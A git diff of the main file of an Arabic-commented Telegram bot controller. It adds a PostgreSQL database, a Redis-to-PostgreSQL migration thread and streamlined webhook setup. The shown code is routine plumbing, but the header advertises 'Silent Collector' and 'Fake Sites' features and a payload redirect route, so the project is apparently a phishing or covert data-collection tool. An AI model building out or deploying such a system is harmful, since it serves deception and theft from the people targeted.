@@ -1,7 +1,7 @@
 # main.py
 # ============================================================
-# DEV 1 - Bot Controller v14
-# مع Webhook Mode (بدل Polling)
+# DEV 1 - Bot Controller v15
+# Webhook Mode + PostgreSQL (NeonDB) + Auto Migration
 # + Admin System + Silent Collector + Fake Sites + Admin Tools
 # + WhatsApp Report + Force Subscribe
 # ============================================================
@@ -56,6 +56,44 @@ from redis_cleaner import start_cleaner
 
 from monitoring import init_monitoring, metrics
 from rate_limiter import start_cleanup_thread
+
+
+# ═══════════════════════════════════════════════════════
+# ⚡ PostgreSQL (NeonDB) — قاعدة البيانات الدائمة
+# ═══════════════════════════════════════════════════════
+DATABASE_ENABLED = False
+
+try:
+    from database import init_database
+    DATABASE_ENABLED = init_database()
+    if DATABASE_ENABLED:
+        logger.info("[+] PostgreSQL initialized")
+    else:
+        logger.warning("[-] PostgreSQL disabled")
+except Exception as e:
+    logger.exception(f"[-] PostgreSQL init failed: {e}")
+    DATABASE_ENABLED = False
+
+
+# ═══════════════════════════════════════════════════════
+# 🚀 Migration: Redis → PostgreSQL (تلقائي)
+# ═══════════════════════════════════════════════════════
+def run_migration_background():
+    """يشغل النقل في الخلفية عند أول تشغيل"""
+    if not DATABASE_ENABLED:
+        logger.warning("[-] Migration skipped: DB not enabled")
+        return
+
+    if not redis_client:
+        logger.warning("[-] Migration skipped: Redis not available")
+        return
+
+    try:
+        from migrate_to_db import run_migration
+        logger.info("🔄 Starting migration: Redis → PostgreSQL")
+        run_migration(redis_client, None)
+    except Exception as e:
+        logger.exception(f"❌ Migration error: {e}")
 
 
 # ═══════════════════════════════════════════════════════
@@ -173,7 +211,7 @@ def wa_redirect(payload_id):
 # ═══════════════════════════════════════════════════════
 WEBHOOK_PATH = "/webhook"
 
-# سر فريد لكل نسخة (يعتمد على BOT_TOKEN)
+# سر فريد لكل نسخة
 WEBHOOK_SECRET = "daf_" + BOT_TOKEN.split(":")[0][:24]
 
 # متغير عام لتخزين الـ URL
@@ -181,19 +219,17 @@ WEBHOOK_URL = None
 
 
 # ═══════════════════════════════════════════════════════
-# ⚡ Webhook Route — يستقبل Updates من تلجرام
+# ⚡ Webhook Route
 # ═══════════════════════════════════════════════════════
 @app.route(WEBHOOK_PATH, methods=['POST'])
 def telegram_webhook():
     """استقبال updates من تلجرام"""
     try:
-        # تحقق من الـ secret header (أمان)
         secret_header = request.headers.get('X-Telegram-Bot-Api-Secret-Token', '')
         if secret_header and secret_header != WEBHOOK_SECRET:
             logger.warning("🚫 Webhook: Invalid secret header")
             return "Unauthorized", 403
 
-        # جلب البيانات
         if request.headers.get('content-type') == 'application/json':
             json_string = request.get_data().decode('utf-8')
             update = telebot.types.Update.de_json(json_string)
@@ -212,7 +248,7 @@ def telegram_webhook():
 # ═══════════════════════════════════════════════════════
 ORIGIN_GATE_EXEMPT = [
     '/', '/health', '/_health', '/_metrics', '/_version',
-    WEBHOOK_PATH,  # ← Webhook معفي من التحقق
+    WEBHOOK_PATH,
 ]
 
 ALLOWED_PREFIXES = (
@@ -394,7 +430,7 @@ else:
 
 
 # ═══════════════════════════════════════════════════════
-# ⚡ Webhook Setup — احترافي
+# ⚡ Webhook Setup
 # ═══════════════════════════════════════════════════════
 def get_base_url():
     """يجيب الدومين من متغيرات البيئة"""
@@ -412,15 +448,11 @@ def get_base_url():
                 candidate = "https://" + candidate
             return candidate.rstrip("/")
 
-    # Fallback
     return "https://daf-production-e34a.up.railway.app"
 
 
 def clear_all_webhooks():
-    """
-    ⚡ يمسح الـ webhook بكل الطرق الممكنة
-    عشان نمنع أي تعارض مع نسخ قديمة
-    """
+    """يمسح الـ webhook بكل الطرق الممكنة"""
     logger.info("🧹 Clearing any existing webhooks...")
 
     try:
@@ -431,8 +463,7 @@ def clear_all_webhooks():
         except Exception as e:
             logger.debug(f"   bot.remove_webhook() error: {e}")
 
-        # 2. عن طريق API مباشر — deleteWebhook بدون parameters
-        #    (بيمسح كل شيء)
+        # 2. عن طريق API مباشر
         try:
             r = requests.get(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
@@ -447,7 +478,6 @@ def clear_all_webhooks():
             logger.warning(f"   API deleteWebhook error: {e}")
 
         # 3. امسح أي polling قديم
-        #    (getUpdates عشان نلغي أي polling شغال)
         try:
             r = requests.get(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
@@ -458,15 +488,13 @@ def clear_all_webhooks():
         except Exception as e:
             logger.debug(f"   getUpdates flush error: {e}")
 
-        # 4. انتظر شوية عشان تلجرام يحدّث حالته
         time.sleep(2)
 
-        # 5. تأكد إن الـ webhook اتمسح فعلاً
+        # 4. تأكد من المسح
         try:
             info = bot.get_webhook_info()
             if info.url:
                 logger.warning(f"   ⚠️ Webhook still active: {info.url}")
-                # حاول تاني
                 try:
                     bot.remove_webhook()
                     time.sleep(1)
@@ -484,16 +512,10 @@ def clear_all_webhooks():
 
 
 def setup_webhook():
-    """
-    ⚡ يعمل setup الـ webhook بشكل احترافي
-    1. يمسح أي webhook قديم
-    2. يسجل webhook جديد
-    3. يتأكد من نجاح التسجيل
-    """
+    """يعمل setup الـ webhook بشكل احترافي"""
     global WEBHOOK_URL
 
     try:
-        # ═══ 1. احصل على URL ═══
         base_url = get_base_url()
         WEBHOOK_URL = base_url + WEBHOOK_PATH
 
@@ -503,10 +525,10 @@ def setup_webhook():
         logger.info(f"🔗 Target URL: {WEBHOOK_URL}")
         logger.info(f"🔐 Secret: {WEBHOOK_SECRET[:20]}...")
 
-        # ═══ 2. امسح أي webhook قديم ═══
+        # امسح أي webhook قديم
         clear_all_webhooks()
 
-        # ═══ 3. تحقق من معلومات البوت ═══
+        # تحقق من معلومات البوت
         try:
             me = bot.get_me()
             logger.info(f"[+] Bot: @{me.username} (ID: {me.id})")
@@ -514,7 +536,7 @@ def setup_webhook():
             logger.error(f"❌ Failed to get bot info: {e}")
             return False
 
-        # ═══ 4. سجل الـ webhook ═══
+        # سجل الـ webhook
         logger.info(f"📡 Registering webhook...")
 
         result = bot.set_webhook(
@@ -536,8 +558,7 @@ def setup_webhook():
             logger.error("❌ set_webhook returned False")
             return False
 
-        # ═══ 5. تأكد من نجاح التسجيل ═══
-        time.sleep(2)  # استنى تلجرام يحدّث الحالة
+        time.sleep(2)
 
         info = bot.get_webhook_info()
 
@@ -550,14 +571,12 @@ def setup_webhook():
         logger.info(f"   Max Connections: {info.max_connections}")
         logger.info(f"   Last Error: {info.last_error_message or 'None'}")
 
-        # ═══ 6. تحقق من URL ═══
         if info.url != WEBHOOK_URL:
             logger.error(f"❌ URL mismatch!")
             logger.error(f"   Expected: {WEBHOOK_URL}")
             logger.error(f"   Got:      {info.url}")
             return False
 
-        # ═══ 7. تحقق من آخر error ═══
         if info.last_error_message:
             logger.warning(f"⚠️ Last error: {info.last_error_message}")
             logger.warning(f"⚠️ Error date: {info.last_error_date}")
@@ -584,18 +603,15 @@ def delete_webhook_on_shutdown():
 
 
 # ═══════════════════════════════════════════════════════
-# ⚡ Delayed Webhook Setup (بعد ما السيرفر يشتغل)
+# ⚡ Delayed Webhook Setup
 # ═══════════════════════════════════════════════════════
 def delayed_webhook_setup():
-    """
-    يعمل setup الـ webhook بعد ما السيرفر يشتغل بـ 5 ثواني
-    عشان نتأكد إن الـ port مفتوح والـ URL شغال
-    """
+    """يعمل setup الـ webhook بعد ما السيرفر يشتغل"""
     try:
         logger.info("⏳ Waiting for server to be ready...")
         time.sleep(5)
 
-        # جرّب تتأكد إن السيرفر شغال
+        # تأكد إن السيرفر شغال
         try:
             base_url = get_base_url()
             test_url = base_url + "/"
@@ -604,7 +620,7 @@ def delayed_webhook_setup():
         except Exception as e:
             logger.warning(f"⚠️ Server check failed: {e}")
 
-        # ═══ الآن اعمل setup ═══
+        # جرّب 3 مرات
         for attempt in range(3):
             logger.info(f"🔄 Webhook setup attempt #{attempt + 1}/3")
 
@@ -630,8 +646,18 @@ if __name__ == "__main__":
         start_cleaner()
         logger.info("[+] Redis cleaner started")
 
-        # ═══ 2. امسح أي webhook قديم فوراً ═══
-        # عشان نمنع التعارض مع النسخة القديمة
+        # ═══ 2. Migration Thread (Redis → PostgreSQL) ═══
+        if DATABASE_ENABLED:
+            migration_thread = threading.Thread(
+                target=run_migration_background,
+                daemon=True,
+            )
+            migration_thread.start()
+            logger.info("[+] Migration thread started")
+        else:
+            logger.warning("[-] Migration skipped: DB disabled")
+
+        # ═══ 3. امسح أي webhook قديم فوراً ═══
         logger.info("⚡ Clearing old webhooks on startup...")
         try:
             requests.get(
@@ -643,13 +669,13 @@ if __name__ == "__main__":
         except Exception as e:
             logger.warning(f"Initial clear webhook error: {e}")
 
-        # ═══ 3. Port ═══
+        # ═══ 4. Port ═══
         port = int(os.environ.get("PORT", 8080))
         logger.info("=" * 60)
         logger.info(f"🌐 Flask Web Server starting on port {port}...")
         logger.info("=" * 60)
 
-        # ═══ 4. شغل الـ Webhook Setup في thread منفصل ═══
+        # ═══ 5. Webhook Setup Thread ═══
         setup_thread = threading.Thread(
             target=delayed_webhook_setup,
             daemon=True,
@@ -657,7 +683,7 @@ if __name__ == "__main__":
         setup_thread.start()
         logger.info("[+] Webhook setup thread started")
 
-        # ═══ 5. شغل Flask ═══
+        # ═══ 6. Flask Server ═══
         app.run(
             host="0.0.0.0",
             port=port,
